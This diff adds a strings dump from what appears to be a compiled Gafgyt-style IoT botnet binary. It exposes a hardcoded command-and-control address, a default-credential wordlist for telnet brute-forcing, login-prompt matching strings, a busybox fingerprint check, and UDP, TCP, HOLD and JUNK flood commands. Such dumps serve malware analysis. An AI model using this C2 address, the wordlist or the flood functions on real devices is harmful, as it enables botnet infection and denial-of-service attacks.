@@ -1,0 +1,279 @@
+/lib/ld-uClibc.so.0
+__deregister_frame_info
+__register_frame_info
+_Jv_RegisterClasses
+_init
+_fini
+__uClibc_main
+strlen
+isspace
+write
+malloc
+memset
+send
+free
+pipe
+getdtablesize
+vfork
+dup2
+execl
+_exit
+sigemptyset
+sigaddset
+sigprocmask
+waitpid
+__errno_location
+read
+wildString
+toupper
+inet_addr
+uppercase
+strstr
+strchr
+strcpy
+fdgets
+rand_cmwc
+select
+mainCommSock
+sockprintf
+recv
+fcntl
+htons
+getHost
+connect
+getsockopt
+numpids
+negotiate
+matchPrompt
+szprintf
+ourIP
+ntohl
+memcpy
+getRandomPublicIP
+socket
+sclose
+time
+readUntil
+usernames
+passwords
+inet_ntoa
+makeRandomStr
+sendto
+setsockopt
+srand
+init_rand
+getRandomIP
+htonl
+makeIPPacket
+strcmp
+strtok
+tcpcsum
+scanPid
+kill
+StartTheLelz
+atoi
+listFork
+sendHOLD
+sendJUNK
+sendUDP
+sendTCP
+getpid
+currentServer
+commServer
+connectTimeout
+getsockname
+ioctl
+macAddress
+getOurIP
+setsid
+chdir
+signal
+initConnection
+sleep
+getBuild
+trim
+fdpopen
+fdpclose
+processCmd
+recvLine
+libc.so.0
+_DYNAMIC_LINKING
+__RLD_MAP
+_GLOBAL_OFFSET_TABLE_
+_ftext
+_fdata
+_edata
+__bss_start
+_fbss
+_end
+yB4!
+yB4& b
+$!(@
+'!(@
+'!(@
+'! @
+B$! @
+'! @
+'! @
+'! @
+'! @
+'! @
+$!(@
+'! @
+$!(@
+B$! @
+B$! `
+B$! `
+D$!(
+'! @
+'! @
+'! @
+'! @
+D$!(
+'! @
+'! @
+'! @
+'! @
+'! @
+B$! @
+B0! @
+B$! `
+B$! @
+$!8`
+B$! @
+'!(@
+'!(@
+'! @
+'! @
+'! @
+B$! @
+b,l	@
+B$! @
+B4! 
+$!0@
+'! @
+$!0@
+P$! 
+E$!0
+P$! 
+P$! 
+P$! 
+E$!0
+P$! 
+E$!0
+E$!8`
+P$! 
+B0! @
+B$! @
+B$! @
+$!8`
+B0! @
+B0! @
+B$! @
+B0! @
+B0! @
+B$! @
+$!8`
+B0! @
+B0! @
+B$! @
+B4! 
+$!0@
+'! @
+B0! @
+B$! @
+B4! 
+$!0@
+'! @
+E$!0`
+'! @
+'! @
+'! @
+B$! @
+'! @
+'! @
+'! @
+D$!(
+'! @
+'! @
+'! @
+'! @
+4!0@
+B$! @
+B$! @
+E$!0`
+B$! @
+'! @
+'! @
+'! @
+'! @
+'! @
+'! @
+'! @
+'! @
+E$!0`
+'! @
+'! @
+B$! @
+B$! 
+'! @
+46.19.143.232:53
+root
+admin
+user
+login
+guest
+toor
+changeme
+1234
+12345
+123456
+default
+pass
+password
+(null)
+buf: %s
+/bin/sh
+/proc/cpuinfo
+BOGOMIPS
+PING
+recv: %s
+:>%$#
+%d.%d.%d.%d
+%d.%d.%d.0
+ogin:
+assword:
+ncorrect
+/bin/busybox;echo -e '\147\141\171\146\147\164'
+gayfgt
+multi-call
+REPORT %s:%s:%s
+REPORT %s:%s:
+Failed opening raw socket.
+Failed setting raw headers mode.
+Invalid flag "%s"
+PONG!
+GETLOCALIP
+My IP: %s
+SCANNER
+SCANNER ON | OFF
+HOLD
+HOLD Flooding %s:%d for %d seconds.
+JUNK
+JUNK Flooding %s:%d for %d seconds.
+UDP Flooding %s for %d seconds.
+UDP Flooding %s:%d for %d seconds.
+TCP Flooding %s for %d seconds.
+KILLATTK
+Killed %d.
+None Killed.
+LOLNOGTFO
+8.8.8.8
+/proc/net/route
+	00000000	
+UNKNOWN
+MAC: %02X:%02X:%02X:%02X:%02X:%02X
+fork failed
+BUILD %s
+PONG
+%s 2>&1
